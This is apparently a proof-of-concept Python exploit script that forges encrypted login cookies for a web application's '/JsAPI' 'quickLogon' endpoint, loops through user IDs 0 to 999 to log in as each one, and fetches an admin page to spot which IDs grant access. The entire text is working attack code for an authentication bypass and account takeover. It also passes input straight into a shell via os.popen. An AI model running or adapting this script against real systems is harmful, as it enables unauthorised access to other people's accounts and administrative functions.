import requests, os, uuid
url = os.sys.argv[1]

s = requests.Session()
s.get(url)

def encrypt(txt):
	return os.popen("java Enc "+txt).read().split('\n')[0]

def loginAs(uuid):
	cookies = {
		"EXTAPI-IPID":encrypt(uuid),
		"EXTAPI-REFID":encrypt("quickLogon")
	}
	data = {
		"api" : "auth",
		"callback":"pew",
	}
	r=s.post(url+"/JsAPI?version=3.0",data=data,cookies=cookies)

def adminReq():
	r =s.get(url+f"/MIEntry.i4;tab_token={uuid.uuid4()};m=1?REQUESTTOKEN=null")
	return r.text

if __name__ == '__main__':
	for ID in range(0,1000):
		s = requests.Session()
		s.get(url)	
		loginAs(str(ID))
		x=adminReq()
		print(f"uuid: {ID}, l: {len(x)}")
